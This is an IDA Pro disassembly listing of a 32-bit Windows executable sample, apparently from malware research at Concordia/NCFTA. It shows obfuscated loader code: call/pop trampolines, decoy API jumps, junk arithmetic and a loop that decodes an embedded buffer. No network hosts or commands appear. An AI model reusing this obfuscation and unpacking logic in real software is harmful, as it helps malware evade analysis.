;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
;
; +-------------------------------------------------------------------------+
; |   This file	has been generated by The Interactive Disassembler (IDA)    |
; |	   Copyright (c) 2010 by Hex-Rays, <support@hex-rays.com>	    |
; |			 License info: 48-B231-7414-99			    |
; |		       NCFTA Canada/Concordia University		    |
; +-------------------------------------------------------------------------+
;
; Input	MD5   :	1B3F47B8F239CBB56306AC9632A022F3
; Input	CRC32 :	9C1CCE27

; File Name   :	c:\Users\farhadi\Desktop\Sample\samples\1b3f47b8f239cbb56306ac9632a022f3
; Format      :	Portable executable for	80386 (PE)
; Imagebase   :	1000000
; Section 1. (virtual address 00001000)
; Virtual size			: 000017B8 (   6072.)
; Section size in file		: 00001800 (   6144.)
; Offset to raw	data for section: 00044400
; Flags	60000020: Text Executable Readable
; Alignment	: default

		include	uni.inc	; see unicode subdir of	ida for	info on	unicode

		.686p
		.mmx
		.model flat

; ===========================================================================

; Segment type:	Pure code
; Segment permissions: Read/Execute
_text		segment	para public 'CODE' use32
		assume cs:_text
		;org 1001000h
		assume es:nothing, ss:nothing, ds:_data, fs:nothing, gs:nothing
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001030	proc near		; CODE XREF: sub_1001440+2Ap
		mov	edi, edi
		push	ebp

loc_1001033:				; CODE XREF: sub_1001030+13j
		mov	ebp, esp
		sub	esp, 4Ch
		lea	eax, [ebx+0B0h]
		cmp	eax, 0DB9h
		jb	short loc_1001033
		push	eax
		rep call sub_1001053
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_1001030	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001053	proc near		; CODE XREF: sub_1001030+16p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	dword ptr [eax+3D0h]
		push	dword ptr [eax+290h]
		push	ecx
		call	sub_1001FC4
		add	esp, 0Ch
		pop	eax
		push	eax
		mov	ebx, 0
		push	ebx
		rep call sub_1001082
		mov	eax, ds:SetEvent
		jmp	eax
sub_1001053	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001082	proc near		; CODE XREF: sub_1001053+22p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 4Ch
		pop	ebp
		retn	0
sub_1001082	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 33h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10010C0	proc near		; CODE XREF: sub_100136C+1Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		lea	edx, asc_10A007C ; "					   "...
		sub	edi, [edx+80h]
		push	edx
		push	0
		rep call sub_10010E4
		mov	eax, ds:CloseHandle
		jmp	eax
sub_10010C0	endp


; =============== S U B	R O U T	I N E =======================================


sub_10010E4	proc near		; CODE XREF: sub_10010C0+17p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	dword ptr [edx+390h]
		push	dword ptr [edx+268h]
		push	esi
		call	sub_1001CEC
		add	esp, 0Ch
		pop	edx
		push	edx
		rep call sub_100110D
		mov	eax, ds:GetTickCount
		jmp	eax
sub_10010E4	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_100110D	proc near		; CODE XREF: sub_10010E4+1Cp
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 3Ch
		pop	ebp
		retn	0
sub_100110D	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001148	proc near		; CODE XREF: start+43j
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 60h
		mov	edx, offset dword_10A0124
		sub	edi, [edx+0FCh]
		push	edx
		push	edi
		push	edi
		call	sub_1001514
		add	esp, 8
		pop	edx
		push	edx
		mov	edi, 0
		push	edi
		rep call sub_100117B
		mov	eax, ds:LocalFree
		jmp	eax
sub_1001148	endp


; =============== S U B	R O U T	I N E =======================================


sub_100117B	proc near		; CODE XREF: sub_1001148+26p
		pop	ecx
		call	ecx
		pop	edx
		mov	esi, offset GetModuleHandleA
		mov	esi, [esi]
		push	esi
		push	dword ptr [edx-0A8h]
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_100117B	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10011C8	proc near		; CODE XREF: sub_1001B70+19p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		lea	edx, [ecx-100h]
		add	ebx, [edx-21Ch]
		push	edx
		push	0
		rep call sub_10011EC
		mov	eax, ds:CloseHandle
		jmp	eax
sub_10011C8	endp


; =============== S U B	R O U T	I N E =======================================


sub_10011EC	proc near		; CODE XREF: sub_10011C8+17p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	esi
		push	dword ptr [edx+74h]
		push	dword ptr [edx+3B0h]
		push	esi
		call	sub_10013C4
		add	esp, 10h
		pop	edx
		push	edx
		mov	esi, 0
		push	esi
		rep call sub_1001219
		mov	eax, ds:GetDC
		jmp	eax
sub_10011EC	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001219	proc near		; CODE XREF: sub_10011EC+20p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 54h
		pop	ebp
		retn	0
sub_1001219	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 60h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001284	proc near		; CODE XREF: sub_1001910+24p

var_4C		= dword	ptr -4Ch

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 3Ch
		adc	dword ptr [esi-98h], 55E0h
		lea	edi, dword_10A03C0
		push	6B4h
		mov	ecx, 6B4h
		push	ecx
		push	40001h
		mov	ecx, 0BA859E15h
		push	dword ptr [ecx+467A9213h]
		sub	[esp+4Ch+var_4C], 2
		mov	ecx, offset LoadLibraryW
		pop	dword ptr [ecx]
		rep call sub_10012CF
		mov	eax, ds:LoadLibraryW
		jmp	eax
sub_1001284	endp


; =============== S U B	R O U T	I N E =======================================


sub_10012CF	proc near		; CODE XREF: sub_1001284+3Ep
		pop	ecx
		call	ecx
		push	eax
		pop	dword ptr [edi-344h]
		mov	eax, [edi-344h]
		mov	edx, eax
		sub	ebx, ebx
		dec	ebx
		and	ebx, offset word_10020F6
		mov	esi, 22419A76h
		push	dword ptr [ebx]
		pop	dword ptr [edx]
		add	ebx, 1
		add	edx, 1
		mov	ecx, 6B4h

loc_10012FE:				; CODE XREF: sub_10012CF+4Ej
		xor	eax, eax
		push	dword ptr [ebx]
		adc	[esp+0], esi
		pop	dword ptr [edx+eax*2]
		sub	esi, esi
		sbb	esi, [ebx+esi*4]
		neg	esi
		shr	esi, 1
		add	ebx, 4
		add	edx, 4
		sub	ecx, 4
		cmp	ecx, 0
		jnz	short loc_10012FE
		mov	ebx, 0
		push	ebx
		rep call sub_1001332
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_10012CF	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001332	proc near		; CODE XREF: sub_10012CF+56p
		pop	ecx
		call	ecx
		add	esp, 3Ch
		pop	ebp
		retn	0
sub_1001332	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100136C	proc near		; CODE XREF: sub_1001584+7p
		mov	edi, edi
		push	ebp

loc_100136F:				; CODE XREF: sub_100136C+13j
		mov	ebp, esp
		sub	esp, 28h
		mov	ecx, offset dword_10A004C
		cmp	ecx, 4C66h
		jz	short loc_100136F
		push	ecx
		push	eax
		push	dword ptr [ecx+200h]
		call	sub_10010C0
		add	esp, 8
		pop	ecx
		push	ecx
		push	0
		rep call sub_10013A2
		mov	eax, ds:IsWindow
		jmp	eax
sub_100136C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_10013A2	proc near		; CODE XREF: sub_100136C+29p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	0
		rep call sub_10013B6
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_10013A2	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_10013B6	proc near		; CODE XREF: sub_10013A2+7p
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 28h
		pop	ebp
		retn	0
sub_10013B6	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10013C4	proc near		; CODE XREF: sub_10011EC+10p

var_10		= dword	ptr -10h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		mov	esi, offset dword_10A01E8
		xor	[ebp+var_10], ecx
		push	0
		rep call sub_10013E3
		mov	eax, ds:PulseEvent
		jmp	eax
sub_10013C4	endp


; =============== S U B	R O U T	I N E =======================================


sub_10013E3	proc near		; CODE XREF: sub_10013C4+12p
		pop	ecx
		call	ecx
		push	esi
		push	ebx
		push	edx
		push	edi
		call	sub_1001694
		add	esp, 0Ch
		pop	esi
		mov	eax, 0
		push	eax
		rep call sub_1001406
		mov	eax, ds:IsWindow
		jmp	eax
sub_10013E3	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001406	proc near		; CODE XREF: sub_10013E3+16p
		pop	ecx
		call	ecx
		add	esp, 2Ch
		pop	ebp
		retn	0
sub_1001406	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001440	proc near		; CODE XREF: sub_1001E5C+20p

var_14		= dword	ptr -14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 24h
		lea	ebx, [edi-210h]
		sub	[ebp+var_14], ebx
		push	ebx
		push	dword ptr [ebx+3F0h]
		push	dword ptr [ebx+3A4h]
		push	dword ptr [ebx+0B0h]
		push	dword ptr [ebx+3C0h]
		call	sub_1001030
		add	esp, 10h
		pop	ebx
		mov	edi, 0
		push	edi
		rep call sub_1001486
		mov	eax, ds:SetLastError
		jmp	eax
sub_1001440	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001486	proc near		; CODE XREF: sub_1001440+39p
		pop	ecx
		call	ecx
		mov	edi, 0
		push	edi
		rep call sub_100149C
		mov	eax, ds:SetFocus
		jmp	eax
sub_1001486	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_100149C	proc near		; CODE XREF: sub_1001486+9p
		pop	ecx
		call	ecx
		add	esp, 24h
		pop	ebp
		retn	0
sub_100149C	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10014A8	proc near		; CODE XREF: sub_1002014+1Bp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 5Ch
		lea	ecx, dword_10A0244
		xor	dword ptr [ecx+180h], 0FFFF96A7h
		push	ecx
		push	ebx
		push	dword ptr [ecx+154h]
		push	dword ptr [ecx+74h]
		push	dword ptr [ecx+33Ch]
		call	sub_1001EE8
		add	esp, 10h
		pop	ecx
		push	ecx
		mov	esi, 0
		push	esi
		rep call sub_10014EE
		mov	eax, ds:PulseEvent
		jmp	eax
sub_10014A8	endp


; =============== S U B	R O U T	I N E =======================================


sub_10014EE	proc near		; CODE XREF: sub_10014A8+39p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		mov	ebx, 0
		push	ebx
		rep call sub_1001506
		mov	eax, ds:Sleep
		jmp	eax
sub_10014EE	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001506	proc near		; CODE XREF: sub_10014EE+Bp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 5Ch
		pop	ebp
		retn	0
sub_1001506	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001514	proc near		; CODE XREF: sub_1001148+16p

var_14		= dword	ptr -14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 40h
		lea	ebx, dword_10A02DC
		adc	[ebp+var_14], 18h
		push	ebx
		push	ecx
		push	edx
		push	edx
		push	edx
		call	sub_100180C
		add	esp, 10h
		pop	ebx
		push	0
		rep call sub_1001543
		mov	eax, ds:SetLastError
		jmp	eax
sub_1001514	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001543	proc near		; CODE XREF: sub_1001514+22p
		pop	ecx
		call	ecx
		push	0
		rep call sub_1001555
		mov	eax, ds:SetFocus
		jmp	eax
sub_1001543	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001555	proc near		; CODE XREF: sub_1001543+5p
		pop	ecx
		call	ecx
		add	esp, 40h
		pop	ebp
		retn	0
sub_1001555	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001560	proc near		; CODE XREF: sub_1001F08+Bp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 34h
		lea	eax, asc_10A007C+4
		mov	esi, [eax+180h]
		push	eax
		push	0
		rep call sub_1001584
		mov	eax, ds:SetFocus
		jmp	eax
sub_1001560	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001584	proc near		; CODE XREF: sub_1001560+17p
		pop	ecx
		call	ecx
		pop	eax
		push	eax
		push	ecx
		push	esi
		call	sub_100136C
		add	esp, 8
		pop	eax
		push	eax
		push	0
		rep call sub_10015A4
		mov	eax, ds:Sleep
		jmp	eax
sub_1001584	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_10015A4	proc near		; CODE XREF: sub_1001584+13p
		pop	ecx
		call	ecx
		pop	eax
		add	esp, 34h
		pop	ebp
		retn	0
sub_10015A4	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10015B0	proc near		; CODE XREF: sub_1001FC4+18p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		mov	edx, offset dword_10A02C0
		sub	[edx-9Ch], ecx
		push	edx
		mov	ecx, 0
		push	ecx
		rep call sub_10015D7
		mov	eax, ds:lstrlenA
		jmp	eax
sub_10015B0	endp


; =============== S U B	R O U T	I N E =======================================


sub_10015D7	proc near		; CODE XREF: sub_10015B0+1Ap
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	edi
		push	edi
		push	ebx
		push	edi
		call	sub_1001750
		add	esp, 10h
		pop	edx
		push	edx
		push	0
		rep call sub_10015F9
		mov	eax, ds:LocalUnlock
		jmp	eax
sub_10015D7	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_10015F9	proc near		; CODE XREF: sub_10015D7+15p
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 54h
		pop	ebp
		retn	0
sub_10015F9	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 90h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001694	proc near		; CODE XREF: sub_10013E3+7p

var_14		= dword	ptr -14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		lea	edi, [esi-144h]
		xor	esi, [ebp+var_14]
		push	edi
		push	dword ptr [edi+250h]
		push	edx
		push	ecx
		push	dword ptr [edi+254h]
		call	sub_1001DD4
		add	esp, 10h
		pop	edi
		mov	edx, 0
		push	edx
		rep call sub_10016D0
		mov	eax, ds:GetDC
		jmp	eax
sub_1001694	endp


; =============== S U B	R O U T	I N E =======================================


sub_10016D0	proc near		; CODE XREF: sub_1001694+2Fp
		pop	ecx
		call	ecx
		mov	eax, 0
		push	eax
		rep call sub_10016E6
		mov	eax, ds:SetFocus
		jmp	eax
sub_10016D0	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_10016E6	proc near		; CODE XREF: sub_10016D0+9p
		pop	ecx
		call	ecx
		add	esp, 48h
		pop	ebp
		retn	0
sub_10016E6	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 60h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001750	proc near		; CODE XREF: sub_10015D7+9p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		lea	ebx, dword_10A02DC
		sbb	edi, [ebx-0C4h]
		push	ebx
		push	eax
		push	dword ptr [ebx+11Ch]
		push	esi
		call	sub_10019FC
		add	esp, 0Ch
		pop	ebx
		mov	eax, 0
		push	eax
		rep call sub_1001789
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_1001750	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001789	proc near		; CODE XREF: sub_1001750+2Cp
		pop	ecx
		call	ecx
		mov	edx, 0
		push	edx
		rep call sub_100179F
		mov	eax, ds:GetDC
		jmp	eax
sub_1001789	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_100179F	proc near		; CODE XREF: sub_1001789+9p
		pop	ecx
		call	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_100179F	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 63h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100180C	proc near		; CODE XREF: sub_1001514+17p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		mov	ecx, offset dword_10A012C
		mov	ebx, 3
		push	ecx
		rep call sub_100182C
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_100180C	endp


; =============== S U B	R O U T	I N E =======================================


sub_100182C	proc near		; CODE XREF: sub_100180C+13p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	ebx
		push	edi
		push	dword ptr [ecx+0ECh]
		call	sub_1001E5C
		add	esp, 0Ch
		pop	ecx
		push	ecx
		mov	edx, 0
		push	edx
		rep call sub_1001856
		mov	eax, ds:PulseEvent
		jmp	eax
sub_100182C	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001856	proc near		; CODE XREF: sub_100182C+1Dp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 28h
		pop	ebp
		retn	0
sub_1001856	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


		public start
start		proc near

var_4		= dword	ptr -4

		mov	ecx, offset lstrlenA
		push	0
		pop	eax
		nop
		nop
		nop
		nop
		call	ds:GetConsoleTitleA
		add	esp, 0FFFFFFF8h
		xor	eax, eax
		lea	eax, ds:10A0100h[eax*4]
		lea	ecx, [eax+0Ch]
		add	byte ptr [ecx],	4
		push	eax		; lpLibFileName
		call	ds:LoadLibraryW
		push	3Ch
		add	[esp+4+var_4], eax
		pop	ecx
		mov	ecx, [ecx]
		sub	ecx, 0FFFFFFAFh
		mov	eax, [eax+ecx]
		shr	eax, 4
		mov	cl, 25h
		cmp	al, cl
		pusha
		jg	short loc_10018AC
		jmp	sub_1001148
; ---------------------------------------------------------------------------

loc_10018AC:				; CODE XREF: start+41j
		popa
		call	dword ptr [esp+0]
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
		nop
start		endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001910	proc near		; CODE XREF: sub_1001C7D+10p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 28h
		lea	esi, dword_10A0388
		add	dword ptr [esi-34h], 0FFFF843Ch
		push	esi
		push	dword ptr [esi+33Ch]
		push	edi
		push	eax
		push	dword ptr [esi+2ECh]
		call	sub_1001284
		add	esp, 10h
		pop	esi
		rep call sub_100194A
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_1001910	endp


; =============== S U B	R O U T	I N E =======================================


sub_100194A	proc near		; CODE XREF: sub_1001910+2Dp
		pop	ecx
		call	ecx
		mov	edx, 0
		push	edx
		rep call sub_1001960
		mov	eax, ds:CloseHandle
		jmp	eax
sub_100194A	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001960	proc near		; CODE XREF: sub_100194A+9p
		pop	ecx
		call	ecx
		add	esp, 28h
		pop	ebp
		retn	0
sub_1001960	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 92h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_10019FC	proc near		; CODE XREF: sub_1001750+1Dp

var_8		= dword	ptr -8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 2Ch
		lea	edx, asc_10A007C+2Ch
		add	edi, [ebp+var_8]
		push	edx
		push	0
		rep call sub_1001A1D
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_10019FC	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001A1D	proc near		; CODE XREF: sub_10019FC+14p
		pop	ecx
		call	ecx
		pop	edx
		push	edx
		push	dword ptr [edx+3Ch]
		push	dword ptr [edx+2E8h]
		push	esi
		push	ebx
		call	sub_1002014
		add	esp, 10h
		pop	edx
		push	edx
		rep call sub_1001A44
		mov	eax, ds:GetTickCount
		jmp	eax
sub_1001A1D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001A44	proc near		; CODE XREF: sub_1001A1D+1Ap
		pop	ecx
		call	ecx
		pop	edx
		add	esp, 2Ch
		pop	ebp
		retn	0
sub_1001A44	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 121h	dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001B70	proc near		; CODE XREF: sub_1001D15+Dp
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 30h
		lea	ecx, [edi+78h]
		xor	[ecx-25Ch], eax
		push	ecx
		push	esi
		push	dword ptr [ecx+36Ch]
		call	sub_10011C8
		add	esp, 8
		pop	ecx
		push	ecx
		mov	eax, 0
		push	eax
		rep call sub_1001BA6
		mov	eax, ds:SetEvent
		jmp	eax
sub_1001B70	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001BA6	proc near		; CODE XREF: sub_1001B70+29p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		mov	ecx, 0
		push	ecx
		rep call sub_1001BBE
		mov	eax, ds:SetLastError
		jmp	eax
sub_1001BA6	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001BBE	proc near		; CODE XREF: sub_1001BA6+Bp
		pop	ecx
		call	ecx
		pop	ecx
		add	esp, 30h
		pop	ebp
		retn	0
sub_1001BBE	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 93h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001C5C	proc near		; CODE XREF: sub_1001DD4+23p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 38h
		lea	ecx, [ebx-34h]
		xor	esi, ebx
		push	ecx
		mov	eax, 0
		push	eax
		rep call sub_1001C7D
		mov	eax, ds:lstrlenA
		jmp	eax
sub_1001C5C	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001C7D	proc near		; CODE XREF: sub_1001C5C+14p
		pop	ecx
		call	ecx
		pop	ecx
		push	ecx
		push	dword ptr [ecx+24h]
		push	ebx
		push	dword ptr [ecx+378h]
		push	edx
		call	sub_1001910
		add	esp, 10h
		pop	ecx
		push	ecx

loc_1001C97:				; CODE XREF: sub_1001CAB+5j
		lea	ecx, [ecx-150h]
		push	ecx
		rep call sub_1001CAB
		mov	eax, ds:GetModuleHandleA
		jmp	eax
sub_1001C7D	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001CAB	proc near		; CODE XREF: sub_1001C7D+21p
		pop	ecx
		call	ecx
		test	eax, eax
		jnz	short loc_1001C97
		pop	ecx
		add	esp, 38h
		pop	ebp
		retn	0
sub_1001CAB	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 32h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001CEC	proc near		; CODE XREF: sub_10010E4+12p
		mov	edi, edi
		push	ebp

loc_1001CEF:				; CODE XREF: sub_1001CEC+14j
		mov	ebp, esp
		sub	esp, 60h
		lea	edi, [edx+23Ch]
		cmp	edi, 7873h
		jbe	short loc_1001CEF
		mov	edx, 0
		push	edx
		rep call sub_1001D15
		mov	eax, ds:GetDC
		jmp	eax
sub_1001CEC	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001D15	proc near		; CODE XREF: sub_1001CEC+1Cp
		pop	ecx
		call	ecx
		push	edi
		push	eax
		push	edx
		push	dword ptr [edi+31Ch]
		push	eax
		call	sub_1001B70
		add	esp, 10h
		pop	edi
		push	0
		rep call sub_1001D3A
		mov	eax, ds:SetFocus
		jmp	eax
sub_1001D15	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001D3A	proc near		; CODE XREF: sub_1001D15+18p
		pop	ecx
		call	ecx
		add	esp, 60h
		pop	ebp
		retn	0
sub_1001D3A	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 90h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001DD4	proc near		; CODE XREF: sub_1001694+20p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		lea	ebx, dword_10A0184
		or	esi, [ebx-94h]
		push	ebx
		push	dword ptr [ebx+8Ch]
		push	dword ptr [ebx+3A4h]
		push	esi
		push	eax
		call	sub_1001C5C
		add	esp, 10h
		pop	ebx
		push	0
		rep call sub_1001E0F
		mov	eax, ds:lstrlenA
		jmp	eax
sub_1001DD4	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001E0F	proc near		; CODE XREF: sub_1001DD4+2Ep
		pop	ecx
		call	ecx
		push	0
		rep call sub_1001E21
		mov	eax, ds:UnmapViewOfFile
		jmp	eax
sub_1001E0F	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001E21	proc near		; CODE XREF: sub_1001E0F+5p
		pop	ecx
		call	ecx
		add	esp, 54h
		pop	ebp
		retn	0
sub_1001E21	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 31h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001E5C	proc near		; CODE XREF: sub_100182C+Dp

var_20		= dword	ptr -20h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 48h
		mov	edi, offset dword_10A028C
		add	[ebp+var_20], 0FFFFFFBBh
		push	edi
		push	ebx
		push	dword ptr [edi+220h]
		push	ecx
		push	dword ptr [edi+220h]
		call	sub_1001440
		add	esp, 10h
		pop	edi
		mov	ebx, 0
		push	ebx
		rep call sub_1001E98
		mov	eax, ds:LocalFree
		jmp	eax
sub_1001E5C	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001E98	proc near		; CODE XREF: sub_1001E5C+2Fp
		pop	ecx
		call	ecx
		mov	eax, 0
		push	eax
		rep call sub_1001EAE
		mov	eax, ds:GetDC
		jmp	eax
sub_1001E98	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001EAE	proc near		; CODE XREF: sub_1001E98+9p
		pop	ecx
		call	ecx
		add	esp, 48h
		pop	ebp
		retn	0
sub_1001EAE	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 30h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_1001EE8	proc near		; CODE XREF: sub_10014A8+29p
		mov	edi, edi
		push	ebp
		mov	ebp, esp
		sub	esp, 54h
		lea	esi, [ecx-28h]
		or	ecx, eax
		mov	edi, 0
		push	edi
		rep call sub_1001F08
		mov	eax, ds:SetFocus
		jmp	eax
sub_1001EE8	endp


; =============== S U B	R O U T	I N E =======================================


sub_1001F08	proc near		; CODE XREF: sub_1001EE8+13p
		pop	ecx
		call	ecx
		push	esi
		push	dword ptr [esi+154h]
		push	ebx
		call	sub_1001560
		add	esp, 8
		pop	esi
		rep call sub_1001F29
		mov	eax, ds:GetCommandLineW
		jmp	eax
sub_1001F08	endp ; sp-analysis failed


; =============== S U B	R O U T	I N E =======================================


sub_1001F29	proc near		; CODE XREF: sub_1001F08+14p
		pop	ecx
		call	ecx
		add	esp, 54h
		pop	ebp
		retn	0
sub_1001F29	endp ; sp-analysis failed

; ---------------------------------------------------------------------------
		db 91h dup(90h)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

